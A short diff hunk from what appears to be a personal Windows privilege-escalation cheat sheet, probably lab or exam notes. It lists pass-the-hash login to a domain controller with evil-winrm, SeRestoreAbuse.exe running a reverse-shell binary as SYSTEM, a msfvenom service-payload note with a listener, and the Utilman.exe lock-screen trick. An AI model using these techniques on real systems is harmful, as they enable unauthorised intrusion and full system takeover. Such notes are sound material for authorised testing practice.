@@ -40,7 +40,7 @@ evil-winrm -i <DCIP> -u Administrator -H <Hash>
 I can write any file. SeRestoreAbuse.exe, from my upload/ folder, points a SYSTEM service at a command and starts it:
 cd C:\Users\Public
 .\SeRestoreAbuse.exe "C:\Users\Public\rev.exe"
-- [ ] rev.exe made with msfvenom -f exe, as in :Pb potatoes, and a listener up
+- [ ] rev.exe made with msfvenom -f exe-service, as in :Pb services, since it runs as a service, and a listener up
 
 ## SeTakeOwnershipPrivilege
 From cmd.exe, Utilman.exe for a SYSTEM prompt at the RDP lock screen:
